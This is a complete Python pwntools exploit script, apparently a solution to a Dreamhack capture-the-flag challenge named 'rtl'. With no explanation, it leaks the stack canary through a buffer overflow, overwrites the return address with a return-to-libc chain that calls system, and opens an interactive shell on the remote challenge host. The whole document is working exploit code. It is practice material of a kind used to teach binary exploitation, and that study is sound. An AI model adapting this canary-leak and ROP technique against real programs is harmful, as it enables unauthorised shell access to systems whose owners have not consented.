#!/usr/bin/python3

from pwn import *

#p = process("./rtl")
p = remote("host1.dreamhack.games", 11945)
e = ELF("./rtl")

gadget = 0x00400853 # pop rdi; ret
ret = 0x00400285
sla = lambda t, s: p.sendlineafter(t, s)

# Leak Canary
padding = "A".encode('utf-8') * 0x38
sla(": ", padding)
p.recvuntil("A\n")
canary = u64(p.recvn(7).rjust(8, b"\x00"))

# Overwrite RET
payload = padding
payload += p64(canary)
payload += "C".encode('utf-8') * 0x8
payload += p64(ret)
payload += p64(gadget)
payload += p64(0x400874)
payload += p64(e.plt['system'])
sleep(0.5)
sla(": ", payload)

p.interactive()
